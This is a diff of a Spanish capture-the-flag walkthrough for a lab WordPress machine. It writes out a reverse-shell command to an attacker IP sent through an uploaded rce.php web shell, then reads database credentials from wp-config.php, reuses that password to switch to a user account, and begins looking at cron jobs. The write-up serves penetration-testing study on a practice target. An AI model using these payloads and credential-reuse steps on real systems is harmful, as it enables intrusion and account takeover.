@@ -8,7 +8,7 @@ Realizamos un escaneo en la red:
 
 ![sudo arp-scan -I eth0 --localnet](arp-scan.png)
 
----
+--- ---------------------------------------------------------------------------
 
 Vemos que hay una máquina VMWare con ip 192.168.1.25. 
 Comprobamos que la máquina esté activa:
@@ -234,5 +234,159 @@ Sin embargo, para trabajar más cómodamente vamos a entablar una reverse shell 
 
 
 ```bash
-bash -c "/bin/bash -i 2&> /dev/tcp/192.196.1.80/443 <0"
+> bash -c "/bin/bash -i >%26 /dev/tcp/192.168.1.80/443 0>%261"
 ``` 
+http://loly.lc/wordpress/wp-content/banners/rce.php?c=bash%20-c%20%22/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.1.80/443%200%3E&1%22
+![reverse-shell-stablished.png](reverse-shell-stablished.png)
+
+Realizamos el tratamiento de la consola para poder operar con mayor facilidad:
+
+```bash
+script /dev/null -c bash
+[Control+Z (^Z)]
+(suspended)
+stty raw -echo; fg
+reset xterm
+tty
+/dev/pts/0
+```
+
+Comienza la fase de escalada de privilegios
+
+```bash
+www-data@ubuntu:/home$ cd /home/loly
+www-data@ubuntu:/home/loly$ ls -la
+total 32
+drwxr-xr-x 2 loly loly 4096 Aug 20  2020 .
+drwxr-xr-x 3 root root 4096 Aug 19  2020 ..
+-rw------- 1 loly loly  196 Aug 20  2020 .bash_history
+-rw-r--r-- 1 loly loly  220 Aug 19  2020 .bash_logout
+-rw-r--r-- 1 loly loly 3771 Aug 19  2020 .bashrc
+-rw------- 1 root root    0 Aug 19  2020 .mysql_history
+-rw-r--r-- 1 loly loly  655 Aug 19  2020 .profile
+-rw-r--r-- 1 loly loly    0 Aug 19  2020 .sudo_as_admin_successful
+-rw------- 1 loly loly  614 Aug 20  2020 .viminfo
+-rw-rw-r-- 1 loly loly   71 Aug 20  2020 cleanup.py
+```
+Buscando en el sistema de archivos 
+
+cosas qe fueron saliendo
+
+whoami
+no hay sudo -l
+no find . -perm ...
+
+Buscando en internet donde se encuentra la base de datos de Wordpress:
+https://www.bluehost.com/help/article/awordpress-find-database
+
+![where_is_wordpress_db.png](where_is_wordpress_db.png)
+
+Así pues vamos al directorio home de www-data
+~/html/wordpress$ y alli está el fichero wp-config.php
+
+```bash
+cat wp-config.php
+```
+
+``` php
+<?php
+...
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpress' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+</** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+...
+```
+Gracias a esto podemos ver el nombre de la base de datos, el username y el password
+
+
+```bash
+> mysql -u wordpress -p
+Enter password <- Entramos el password
+
+MariaDB[(none)]> connect wordpress
+```
+
+Tras mirar un tiempo, no encontramos nada relevante, por lo que abandonamos esta vía.
+
+---
+
+Probamos a usar el password de la base de datos como password para la cuenta loly.
+
+```bash
+su loly
+password: lolyisabeautifulgirl
+
+loly@ubuntu:/var/www/html/wordpress/wp-content/banners$
+```
+
+y funciona correctamente!
+
+--- ---------------------------------------------------------------------------
+
+```bash
+>  ls -la /home/loly
+
+total 32
+drwxr-xr-x 3 loly loly 4096 Jan 20 14:52 .
+drwxr-xr-x 3 root root 4096 Aug 19  2020 ..
+-rw------- 1 loly loly 3934 Jan 20 10:11 .bash_history
+-rw-r--r-- 1 loly loly  220 Aug 19  2020 .bash_logout
+-rw-r--r-- 1 loly loly 3771 Aug 19  2020 .bashrc
+-rw-rw-r-- 1 loly loly  226 Jan 20 14:28 cleanup.py
+-rw-rw-r-- 1 loly loly 1024 Jan 20 14:52 .cleanup.py.swp
+-rw------- 1 root root    0 Aug 19  2020 .mysql_history
+-rw-r--r-- 1 loly loly  655 Aug 19  2020 .profile
+-rw-r--r-- 1 loly loly    0 Aug 19  2020 .sudo_as_admin_successful
+-rw------- 1 loly loly  614 Aug 20  2020 .viminfo
+```
+
+--- ---------------------------------------------------------------------------
+
+https://askubuntu.com/questions/57808/what-is-the-popularity-contest-package-for
+
+Google: where are stored the cron user jobs?
+> Cron jobs are stored in a crontab file by username. These files are stored in /var/spool/cron/crontabs or /var/spool/cron/ .
+
+loly@ubuntu:/var/spool/cron$ ls -la
+
+```bash
+total 12
+drwxr-xr-x 3 root root    4096 Aug 19  2020 .
+drwxr-xr-x 4 root root    4096 Aug 19  2020 ..
+drwx-wx--T 2 root crontab 4096 Jan 21 01:55 crontabs
+loly@ubuntu:/var/spool/cron$ cd crontabs/
+bash: cd: crontabs/: Permission denied
+```
